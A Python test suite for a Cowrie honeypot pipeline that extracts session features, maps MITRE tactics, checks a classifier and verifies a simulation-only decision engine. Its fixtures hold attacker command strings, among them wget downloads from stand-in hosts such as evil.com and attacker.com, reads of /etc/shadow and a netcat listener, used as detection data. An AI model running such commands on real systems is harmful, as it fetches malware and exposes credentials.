"""
Comprehensive regression and parity test suite for the Cowrie-to-Module4 integration.

Verifies:
1. Feature parity between the integration and CowrieSessionAdapter.
2. Canonical 26 feature names and ordering.
3. Pattern ratios bounded in [0.0, 1.0] without double counting.
4. Correct executable-token extraction for paths, pipes, command chains, and wrappers.
5. Deterministic heuristic MITRE and risk-feature consistency.
6. Raw-feature scaling occurring exactly once with the frozen scaler.
7. Safe handling of invalid timestamps, malformed records, and empty sessions.
8. Module 4 decision validation and simulation-only execution.
9. Bit-for-bit preservation of existing model and scaler artifacts.
"""

import hashlib
import json
import math
import pathlib
import sys
import unittest
from datetime import datetime, timezone
import numpy as np

# Ensure repository root and Module 3 root are in sys.path
PROJECT_ROOT = pathlib.Path(__file__).resolve().parent.parent
MODULE3_ROOT = PROJECT_ROOT / "module3_ai_xai_engine"

if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))
if str(MODULE3_ROOT) not in sys.path:
    sys.path.insert(0, str(MODULE3_ROOT))

from config import MODULE2_CANONICAL_FEATURE_NAMES, MODULE2_FEATURE_COUNT
from models.two_output_predictor import TwoOutputPredictor
from module4_decision_engine.decision_engine import decide
from module4_decision_engine.execution_adapter import simulate_decision
from training.cowrie_adapter import (
    CowrieSessionAdapter,
    extract_executable_tokens,
    parse_iso_timestamp,
)


class TestIntegrationParity(unittest.TestCase):
    """Test suite covering Phase 4 verification requirements."""

    @classmethod
    def setUpClass(cls):
        cls.adapter = CowrieSessionAdapter(enable_heuristic_enrichment=True)
        cls.model_dir = MODULE3_ROOT / "experiments" / "two_output_model_v1"
        cls.predictor = TwoOutputPredictor(model_dir=cls.model_dir)

        # Baseline artifact SHA-256 hashes
        cls.expected_hashes = {
            "binary_weaponization_model.joblib": "1cb17b111b25b837b6de36bf5a4cf1075c666c8336786da31f088142de18e057",
            "multilabel_intent_model.joblib": "f0f1d092820143e0985a08fd7316843748676cb9e73ae6f642ed5a13a1459c10",
            "cowrie_adapter_scaler.joblib": "bb9e8c6893452a915379a4d34d67c375620f17f85c1418649df243d261f64157",
            "model_metadata.json": "6d255d6e07836fd01d8d35d262411d9965a188a6ee92688c2a0643fb9769ddba",
        }

    # -----------------------------------------------------------------------
    # 1. Feature Parity between Integration and CowrieSessionAdapter
    # -----------------------------------------------------------------------
    def test_feature_parity_with_cowrie_adapter(self):
        """Verify that session features computed for representative commands match CowrieSessionAdapter."""
        session_dict = {
            "session_id": "TEST_PARITY_001",
            "commands": ["uname -a", "cat /etc/passwd | grep root", "wget http://evil.com/x -O /tmp/x"],
            "timestamps": [
                datetime(2026, 10, 22, 10, 0, 0, tzinfo=timezone.utc),
                datetime(2026, 10, 22, 10, 0, 10, tzinfo=timezone.utc),
                datetime(2026, 10, 22, 10, 0, 25, tzinfo=timezone.utc),
            ],
            "src_ip": "192.168.1.100",
        }

        features, provenance = self.adapter.compute_session_features(session_dict)

        self.assertEqual(len(features), MODULE2_FEATURE_COUNT)
        self.assertEqual(features["total_events"], 3.0)
        self.assertEqual(features["command_count"], 3.0)
        self.assertEqual(features["unique_commands"], 3.0)
        self.assertEqual(features["session_duration_seconds"], 25.0)
        self.assertEqual(features["min_inter_event_seconds"], 10.0)
        self.assertEqual(features["max_inter_event_seconds"], 15.0)
        self.assertAlmostEqual(features["mean_inter_event_seconds"], 12.5)

        # Check provenance mappings
        self.assertEqual(provenance["total_events"], "GENUINE_OBSERVED")
        self.assertEqual(provenance["unique_processes"], "DERIVED_FROM_COMMAND_EXECUTABLES")
        self.assertEqual(provenance["unique_mitre_tactics"], "DETERMINISTIC_HEURISTIC_ENRICHMENT")

    # -----------------------------------------------------------------------
    # 2. Canonical 26 Feature Names and Ordering
    # -----------------------------------------------------------------------
    def test_canonical_26_feature_names_and_ordering(self):
        """Verify all 26 feature names and exact order match specification."""
        session_dict = {
            "session_id": "TEST_SCHEMA_ORDER",
            "commands": ["ls"],
            "timestamps": [datetime(2026, 10, 22, 12, 0, 0, tzinfo=timezone.utc)],
        }
        features, _ = self.adapter.compute_session_features(session_dict)

        self.assertEqual(len(MODULE2_CANONICAL_FEATURE_NAMES), 26)
        for idx, name in enumerate(MODULE2_CANONICAL_FEATURE_NAMES):
            self.assertIn(name, features)
            self.assertIsInstance(features[name], (int, float))
            self.assertTrue(math.isfinite(features[name]))

    # -----------------------------------------------------------------------
    # 3. Pattern Ratios Bounded in [0.0, 1.0] Without False Multi-Counting
    # -----------------------------------------------------------------------
    def test_pattern_ratios_bounded_zero_to_one(self):
        """Verify pattern ratios never exceed 1.0 and substring collisions (like who in whoami) are avoided."""
        # 1 command containing curl AND wget AND tftp -> network and download utility ratio must be exactly 1.0, not 3.0
        session_multi_download = {
            "session_id": "TEST_MULTI_RATIO",
            "commands": ["curl http://a.com | wget http://b.com || tftp -g 1.2.3.4"],
            "timestamps": [datetime.now(timezone.utc)],
        }
        feats, _ = self.adapter.compute_session_features(session_multi_download)
        self.assertLessEqual(feats["network_utility_ratio"], 1.0)
        self.assertLessEqual(feats["download_utility_ratio"], 1.0)
        self.assertEqual(feats["network_utility_ratio"], 1.0)
        self.assertEqual(feats["download_utility_ratio"], 1.0)

        # Substring collision test: whoami contains who and whoami
        session_whoami = {
            "session_id": "TEST_WHOAMI",
            "commands": ["whoami"],
            "timestamps": [datetime.now(timezone.utc)],
        }
        feats_who, _ = self.adapter.compute_session_features(session_whoami)
        self.assertEqual(feats_who["identity_command_ratio"], 1.0)

    # -----------------------------------------------------------------------
    # 4. Correct Executable-Token Extraction
    # -----------------------------------------------------------------------
    def test_executable_token_extraction(self):
        """Verify executable tokens handle paths, pipelines, chains, and wrappers."""
        # Pipeline
        self.assertEqual(extract_executable_tokens("cat /etc/passwd | grep root"), ["cat", "grep"])
        # Command chains
        self.assertEqual(extract_executable_tokens("id; uname -a && hostname"), ["id", "uname", "hostname"])
        # Path stripping
        self.assertEqual(extract_executable_tokens("/usr/bin/wget http://test.com/mal"), ["wget"])
        # Wrappers (sudo, busybox, nohup)
        self.assertEqual(extract_executable_tokens("sudo busybox nc -lp 4444"), ["nc"])
        self.assertEqual(extract_executable_tokens("nohup ./script.sh > /dev/null &"), ["script.sh"])
        # Environment variable assignment
        self.assertEqual(extract_executable_tokens("PORT=8080 /bin/nc -l 8080"), ["nc"])

    # -----------------------------------------------------------------------
    # 5. MITRE and Risk-Feature Consistency
    # -----------------------------------------------------------------------
    def test_mitre_and_risk_feature_consistency(self):
        """Verify deterministic heuristic enrichment derives MITRE tactics/techniques and risk metrics."""
        session_recon = {
            "session_id": "TEST_RECON",
            "commands": ["uname -a", "id", "whoami", "ifconfig"],
            "timestamps": [datetime.now(timezone.utc)] * 4,
        }
        feats, _ = self.adapter.compute_session_features(session_recon)
        # Discovery commands map to Discovery tactic and T1082, T1033, T1049
        self.assertGreaterEqual(feats["unique_mitre_tactics"], 1.0)
        self.assertGreaterEqual(feats["unique_mitre_techniques"], 2.0)
        self.assertAlmostEqual(feats["mean_risk_score"], 4.0)

        session_weaponized = {
            "session_id": "TEST_WEAPONIZED",
            "commands": ["wget http://attacker.com/mal.elf", "cat /etc/shadow"],
            "timestamps": [datetime.now(timezone.utc)] * 2,
        }
        feats_w, _ = self.adapter.compute_session_features(session_weaponized)
        self.assertGreaterEqual(feats_w["max_risk_score"], 9.0)
        self.assertEqual(feats_w["high_or_critical_ratio"], 1.0)

    # -----------------------------------------------------------------------
    # 6. Raw-Feature Scaling Occurs Exactly Once
    # -----------------------------------------------------------------------
    def test_raw_feature_scaling_applied_exactly_once(self):
        """Verify predictor applies frozen scaler exactly once without double-scaling or mutation."""
        session_dict = {
            "session_id": "TEST_SCALING",
            "commands": ["whoami", "id"],
            "timestamps": [datetime.now(timezone.utc)],
        }
        raw, _ = self.adapter.compute_session_features(session_dict)

        payload = {
            "schema_version": "1.0",
            "session_id": "TEST_SCALING",
            "feature_count": MODULE2_FEATURE_COUNT,
            "feature_names": list(MODULE2_CANONICAL_FEATURE_NAMES),
            "feature_vector": [float(raw[k]) for k in MODULE2_CANONICAL_FEATURE_NAMES],
            "raw_features": raw,
            "sequence": ["cmd:whoami", "cmd:id"],
        }

        # Predict session
        res = self.predictor.predict_session(payload)
        self.assertIn(res.classification.predicted_label, ["low_interaction_probe", "weaponized_intrusion"])
        self.assertGreaterEqual(res.classification.confidence, 0.0)
        self.assertLessEqual(res.classification.confidence, 1.0)

        # Confirm original raw features dict is untouched
        self.assertEqual(raw["total_events"], 2.0)

    # -----------------------------------------------------------------------
    # 7. Invalid Timestamps, Malformed Records, and Empty Sessions
    # -----------------------------------------------------------------------
    def test_invalid_timestamps_malformed_records_empty_sessions(self):
        """Verify robust handling of invalid timestamps and edge-case sessions."""
        # Unparseable timestamp string
        self.assertIsNone(parse_iso_timestamp("invalid-date-string"))
        self.assertIsNone(parse_iso_timestamp(""))
        self.assertIsNone(parse_iso_timestamp(None))

        # Valid timestamp parsing
        parsed = parse_iso_timestamp("2026-10-22T14:00:00Z")
        self.assertIsNotNone(parsed)

        # Empty session commands
        empty_session = {
            "session_id": "TEST_EMPTY",
            "commands": [],
            "timestamps": [],
        }
        feats_empty, prov_empty = self.adapter.compute_session_features(empty_session)
        self.assertEqual(feats_empty["total_events"], 0.0)
        self.assertEqual(feats_empty["session_duration_seconds"], 0.0)
        self.assertEqual(feats_empty["mean_inter_event_seconds"], 0.0)
        self.assertEqual(feats_empty["commands_per_minute"], 0.0)

        # Single event with no timestamp
        single_event_no_ts = {
            "session_id": "TEST_NO_TS",
            "commands": ["pwd"],
            "timestamps": [],
        }
        feats_single, _ = self.adapter.compute_session_features(single_event_no_ts)
        self.assertEqual(feats_single["session_duration_seconds"], 0.0)
        self.assertEqual(feats_single["mean_inter_event_seconds"], 0.0)
        for val in feats_single.values():
            self.assertTrue(math.isfinite(val))

    # -----------------------------------------------------------------------
    # 8. Module 4 Decision Validation and Simulation-Only Execution
    # -----------------------------------------------------------------------
    def test_module4_decision_validation_and_simulation(self):
        """Verify Module 4 decision engine and simulation adapter preserve simulation safety."""
        # Weaponized intrusion prediction fixture
        module3_output = {
            "session_id": "TEST_M4_INTEGRATION",
            "classification": {
                "predicted_class": 1,
                "predicted_label": "weaponized_intrusion",
                "confidence": 0.92,
            },
            "intent": {
                "detected_intents": ["reconnaissance"],
                "intent_scores": {"reconnaissance": 0.90},
                "unsupported_intents": ["credential_access"],
            },
            "shap_explanation": {
                "top_features": [{"feature_name": "network_utility_ratio", "shap_value": 0.25}],
            },
        }

        decision = decide(module3_output)
        self.assertEqual(decision["selected_strategy"], "reconnaissance_decoy_profile")
        self.assertEqual(decision["execution_status"], "pending")
        self.assertTrue(decision["requires_execution_layer"])

        # Pass decision into simulation adapter
        sim = simulate_decision(decision)
        self.assertEqual(sim["status"], "simulated_only")
        self.assertEqual(sim["execution_mode"], "simulation_only")
        self.assertFalse(sim["applied_to_cowrie"])
        self.assertFalse(sim["commands_executed"])
        self.assertEqual(sim["simulated_profile"], "profile_simulated_recon_decoy")

    # -----------------------------------------------------------------------
    # 9. Preservation of Existing Model and Scaler Artifacts
    # -----------------------------------------------------------------------
    def test_preservation_of_existing_model_and_scaler_artifacts(self):
        """Verify that model files and scaler have not been modified, retrained, or refit."""
        for filename, expected_hash in self.expected_hashes.items():
            path = self.model_dir / filename
            self.assertTrue(path.is_file(), f"Missing artifact: {path}")
            current_hash = hashlib.sha256(path.read_bytes()).hexdigest()
            self.assertEqual(
                current_hash,
                expected_hash,
                f"Artifact {filename} was modified! Hash mismatch: {current_hash} != {expected_hash}",
            )


if __name__ == "__main__":
    unittest.main()
